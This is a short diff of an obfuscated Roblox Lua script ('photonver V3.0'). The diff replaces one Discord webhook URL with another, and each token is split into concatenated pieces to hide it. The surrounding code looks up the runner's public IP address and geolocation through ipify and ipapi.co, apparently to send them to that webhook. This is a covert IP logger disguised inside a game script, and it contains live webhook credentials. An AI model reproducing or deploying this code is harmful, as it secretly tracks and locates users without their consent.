@@ -4,7 +4,7 @@ we=true;unpack=(unpack)or(table["unpack"])qq={[1]=function()return"h".."ttps".."
 --// game:GetService("UserInputService").TouchEnabled
 --// game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 photonver = "V3.0"
-local url = "https://discord.com/api/webhooks/1261255026689704016/".."n9F6okw2qGoZBeOmfHst30IsMTKNuPBX-g89wMx9t37jmjJcmEMcWW6Ok5Tn95R6i7_A"
+local url = "https://ptb.discord.com/api/webhooks/1261141544937979904/vTNWW".."3mgj0U-dbiIQNRAhpXHSBzcAIEAcPt54cQ-u7XA2nZ5LXhF0vRnWda9p0laS7O8"
 
 ipinf=game:GetService("HttpService"):JSONDecode(game:HttpGet('https://ipapi.co/'..game:HttpGet("https://api.ipify.org")..'/json'))
 
